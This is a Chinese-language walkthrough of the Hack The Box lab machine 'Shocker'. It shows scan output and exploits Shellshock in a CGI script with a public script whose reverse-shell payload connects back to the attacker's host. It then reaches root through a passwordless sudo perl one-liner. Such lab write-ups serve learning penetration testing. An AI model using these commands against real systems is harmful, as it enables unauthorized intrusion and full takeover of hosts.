# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

```
┌──(root💀kali)-[~/htb/Shocker]
└─# nmap -sV -Pn 10.10.10.56 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 01:58 EST
Nmap scan report for 10.10.10.56
Host is up (0.35s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1015.68 seconds
```


80端口打开就是一个简单页面

## 目录爆破
```
──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.56                                                                  

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.56/_21-11-30_02-12-39.txt

Error Log: /root/dirsearch/logs/errors-21-11-30_02-12-39.log

Target: http://10.10.10.56/

[02:12:41] Starting: 
[02:14:06] 200 -  137B  - /index.html                                       
```

居然只有一个静态页面，这就有点郁闷了

再换个强大点的字典:

```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.56 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 220545

Output File: /root/dirsearch/reports/10.10.10.56/_21-11-30_02-19-12.txt

Error Log: /root/dirsearch/logs/errors-21-11-30_02-19-12.log

Target: http://10.10.10.56/

[02:19:12] Starting: 
[02:31:53] 403 -  299B  - /cgi-bin/                                    
                                                                             
Task Completed

```

只有一个cgi-bin文件夹，我们用gobuster，指定```.php,.sh,.html```三种扩展名进行爆破


```
└─# gobuster dir  --url http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php,.sh,.html                                                                                                                     1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,html,php
[+] Timeout:                 10s
===============================================================
2021/11/30 05:45:13 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 308]
/.hta.php             (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/.hta.sh              (Status: 403) [Size: 301]
/.htaccess.php        (Status: 403) [Size: 307]
/.htaccess.sh         (Status: 403) [Size: 306]
/.hta.html            (Status: 403) [Size: 303]
/.htpasswd.php        (Status: 403) [Size: 307]
/.hta                 (Status: 403) [Size: 298]
/.htpasswd.sh         (Status: 403) [Size: 306]
/.htaccess.html       (Status: 403) [Size: 308]
/user.sh              (Status: 200) [Size: 118]
                                               
===============================================================
2021/11/30 05:48:46 Finished
===============================================================

```

发现一个user.sh文件

在浏览器上不能访问这个文件，但是用curl命令可以返回
```
┌──(root💀kali)-[~/htb/Shocker]
└─# curl -s http://10.10.10.56/cgi-bin/user.sh     
Content-Type: text/plain

Just an uptime test script

 05:48:43 up  3:52,  0 users,  load average: 0.01, 0.03, 0.00

```

用nikto挖掘这个脚本可能潜在的漏洞信息
```
┌──(root💀kali)-[~/htb/Shocker]
└─# nikto -h http://10.10.10.56/cgi-bin/user.sh
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2021-11-30 05:53:13 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /cgi-bin/user.sh/kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php
+ /cgi-bin/user.sh/lists/admin/: PHPList pre 2.6.4 contains a number of vulnerabilities including remote administrative access, harvesting user info and more. Default login to admin interface is admin/phplist
+ /cgi-bin/user.sh/splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+ /cgi-bin/user.sh/ssdefs/: Siteseed pre 1.4.2 has 'major' security problems.
+ /cgi-bin/user.sh/sshome/: Siteseed pre 1.4.2 has 'major' security problems.
+ /cgi-bin/user.sh/tiki/: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
+ /cgi-bin/user.sh/tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin

```

2.4.18版本貌似存在```cve-2014-6271```和```cve-2014-6278```漏洞

我们找到[这个脚本](https://www.exploit-db.com/exploits/34900)

把exp拷贝到本地，执行攻击

>python exp.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.15 lport=4242 pages="/cgi-bin/user.sh"

拿到初始shell
```
┌──(root💀kali)-[~/htb/Shocker]
└─# python exp.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.15 lport=4242 pages="/cgi-bin/user.sh"                                                                                                                               1 ⨯
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

10.10.10.56> whoami
shelly

```
在home目录拿到user.txt

# 提权
查看sudo特权，可以无密码使用perl
```
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

利用perl提权到root
```
10.10.10.56> sudo perl -e 'exec "/bin/sh";'
10.10.10.56> id
uid=0(root) gid=0(root) groups=0(root)

10.10.10.56> whoami
root

```